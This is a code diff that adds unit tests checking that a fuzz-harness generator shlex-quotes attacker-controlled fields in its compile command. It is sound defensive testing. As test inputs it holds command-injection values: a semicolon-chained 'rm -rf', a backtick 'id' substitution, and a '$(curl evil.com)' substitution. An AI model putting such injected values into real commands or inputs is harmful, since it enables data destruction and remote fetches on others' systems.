@@ -144,5 +144,107 @@ class TestHarnessGenerator(unittest.TestCase):
             )
 
 
+class TestCompileCommandShellSafety(unittest.TestCase):
+    """compile_command is stored as a str on GeneratedHarness and
+    consumed by operators who often `sh -c` it or paste into a build
+    script. Attacker-influenced fields (target binary symbol names,
+    include paths parsed from binary metadata, library names from
+    header inspection) MUST be shlex-quoted to prevent command
+    injection. Per PR #488 review."""
+
+    def _make_header(self, body: str = "int foo(void);\n") -> Path:
+        f = tempfile.NamedTemporaryFile(
+            suffix=".h", delete=False, prefix="r2-cmdq-",
+        )
+        f.write(body.encode())
+        f.close()
+        self.addCleanup(lambda p=f.name: Path(p).unlink(missing_ok=True))
+        return Path(f.name)
+
+    def test_semicolon_in_target_function_quoted(self):
+        """A target binary that exposes a function literally named
+        `foo;rm -rf /tmp/CANARY` (or any shell-meta-containing symbol)
+        must not result in a compile_command shell can split into
+        multiple commands. Re-tokenisation via shlex.split should
+        produce the entire malicious payload as a SINGLE output-name
+        token."""
+        import shlex as _shlex
+        header = self._make_header()
+        spec = HarnessSpec(
+            target_function="foo;rm -rf /tmp/CANARY",
+            header_path=header,
+            include_paths=[],
+            library_name=None,
+        )
+        gen = HarnessGenerator(llm=None)
+        harness = gen.generate(spec)
+        cmd = harness.compile_command
+        tokens = _shlex.split(cmd)
+        o_idx = tokens.index("-o")
+        output_name = tokens[o_idx + 1]
+        self.assertIn("rm -rf /tmp/CANARY", output_name,
+                      msg=f"shell could split this: {cmd!r}")
+
+    def test_backtick_in_library_name_quoted(self):
+        """Library names parsed from binary metadata could contain
+        backticks (command substitution). Must survive shell parsing
+        as a single token."""
+        import shlex as _shlex
+        header = self._make_header()
+        spec = HarnessSpec(
+            target_function="foo",
+            header_path=header,
+            include_paths=[],
+            library_name="mylib`id`",
+        )
+        gen = HarnessGenerator(llm=None)
+        harness = gen.generate(spec)
+        tokens = _shlex.split(harness.compile_command)
+        self.assertIn("-lmylib`id`", tokens, msg=(
+            f"library_name not quoted — backtick substitution possible: "
+            f"{harness.compile_command!r}"
+        ))
+
+    def test_dollar_in_include_path_quoted(self):
+        """Include paths from binary-metadata extraction could contain
+        `$(...)` command substitution. Must survive shell parsing."""
+        import shlex as _shlex
+        header = self._make_header()
+        spec = HarnessSpec(
+            target_function="foo",
+            header_path=header,
+            include_paths=["/tmp/$(curl evil.com)/include"],
+            library_name=None,
+        )
+        gen = HarnessGenerator(llm=None)
+        harness = gen.generate(spec)
+        tokens = _shlex.split(harness.compile_command)
+        i_tokens = [t for t in tokens if t.startswith("-I")]
+        self.assertEqual(len(i_tokens), 1)
+        self.assertIn("$(curl evil.com)", i_tokens[0], msg=(
+            f"include path not quoted: {harness.compile_command!r}"
+        ))
+
+    def test_benign_input_unchanged_by_quoting(self):
+        """shlex.quote is a no-op on shell-safe strings. Operator-
+        readable output should still look natural for typical input."""
+        header = self._make_header()
+        spec = HarnessSpec(
+            target_function="parse_message",
+            header_path=header,
+            include_paths=["/usr/include/mylib"],
+            library_name="mylib",
+        )
+        gen = HarnessGenerator(llm=None)
+        harness = gen.generate(spec)
+        cmd = harness.compile_command
+        # No spurious single-quotes around benign strings — operator
+        # eyeballing the command sees the same shape they would
+        # pre-quote.
+        self.assertIn("-I/usr/include/mylib", cmd)
+        self.assertIn("-lmylib", cmd)
+        self.assertIn("-o fuzz_parse_message", cmd)
+
+
 if __name__ == "__main__":
     unittest.main()
